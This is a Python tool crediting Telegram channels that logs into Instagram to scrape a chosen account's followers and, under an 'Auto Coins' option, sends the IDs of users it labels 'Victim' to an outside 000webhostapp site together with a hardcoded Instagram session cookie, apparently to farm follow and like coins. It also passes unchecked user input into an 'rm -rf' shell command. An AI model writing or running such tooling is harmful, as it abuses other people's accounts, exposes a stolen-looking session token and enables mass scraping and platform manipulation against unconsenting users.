try:
 import requests,uuid,instaloader,os
except ModuleNotFoundError:
 os.system('pip install instaloader')
 os.system('pip install requests')
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
logo=(f"""{E}- - - - - - - - - - - - - - - - -  - - - - -  
{B}      ⌯ Channel: @ZHHHHOX
{E}      ⌯ Channel: @EEEER42
{B}      ⌯ By:  @ZHHHHOX
{E}      ⌯ By: @EEEEE41
{B}      ⌯ Youtube: Kakawi
{E}- - - - - - - - - - - - - - - - -  - - - - - """)
def Followers():
 os.system('clear')
 print(logo)
 L = instaloader.Instaloader()
 username=input(G+'[+] UserName ==> ')
 password=input(S+'[+] PassWord ==> ')
 getuser=input(B+'[+] User To Get Followers ==> ')
 os.system(f'rm -rf {getuser}.txt')
 L.login(username,password)
 profile = instaloader.Profile.from_username(L.context, getuser)
 follow_list = []
 count=0
 for followee in profile.get_followers():
    follow_list.append(followee.username)
    file = open(f"{getuser}.txt","a+")
    file.write(follow_list[count])
    file.write("\n")
    file.close()
    print(follow_list[count])
    count=count+1
def Fira(id,user,firauser):
 url = "https://firakakawizhox.000webhostapp.com"
 data = {'inscoo':'Cookie: mid=YeigMAABAAFMEFsC25itsMXRyBbm; ig_did=B3506D82-E828-485C-AE46-14511B54DFD0; ig_nrcb=1; csrftoken=Kr0m2ZT5o54coqGGm86kxPoGzjvHsTSy; ds_user_id=8434645708; sessionid=51685989704%3AoDD5exTDi2x2jV%3A29 ; shbid="9176\0548434645708\0541674171546:01f7d48d161bbfc55baad4c92541ab26d2f9542285479b5c44cf47446250cd2797d8d453"; shbts="1642635546\0548434645708\0541674171546:01f7a137cebe03c17a70180b5e820fead18ce91518a24b6a08743f8b1f0523c18f26a9bb"; rur="LDC\0548434645708\0541674171546:01f70778426ad879bf3b4bec4d17752e5b27508475682dccd8ecc3848a12fa33cf4caa54"',
 'pkx':id,
 'uname':firauser,
 'submit':'submit'}
 whisper=requests.post(url,data=data)
 info=str(whisper.text)
 like=str(info.split('Like Coin- :')[1])
 likecoin=like.split('<br>')[0]
 follow=str(info.split('Follow Coin- :')[1])
 followcoin=follow.split('\n')[0]
 inf=(f"""{B}[‍🖤] Victim's ID ==> {id}
{S}[💕] Victim's User ==> {user}
{S}[👥] Follow Coin ==> {followcoin}
{S}[❤] Like Coin ==> {likecoin}""")
 if 'Status- : ok' in info:
  print(f"""{G}[💕] Send To ==> {firauser}
{inf}
{G}[✔️] Succsses @ZHHHHOX""")
 if 'Status- : nok' in info:
  print(f"""{inf}
{E}[❌] Not Succsses @ZHHHHOX""")
 if 'Blocked' in info:
  print(f"""{E}[🚫] Blocked User""")
 else:
  print(inf)
def UserID(user,firauser):
 L = instaloader.Instaloader()
 profile = str(instaloader.Profile.from_username(L.context,user))
 idd=str(profile.split(')>')[0])
 id=idd.split(' (')[1]
 Fira(id,user,firauser)
def Start():
 os.system('clear')
 print(logo)
 file="you_8.1.txt"
 firauser="mina.01090"
 for Whisper in open(file,'r').read().splitlines():
  username=str(Whisper.split('\n')[0])
  if 'instagram.com' in username:
   u=str(username.split('com/')[1])
   us=str(u.split('?')[0])
   user=us
  else:
   user=username
  UserID(user,firauser)
os.system('clear')
print(logo)
Choose=input(f'''{S}[1] Get Followers
{B}[2] Auto Coins
{G}[+] Choose ==> ''')
if Choose == '1':
 Followers()
if Choose == '2':
 Start()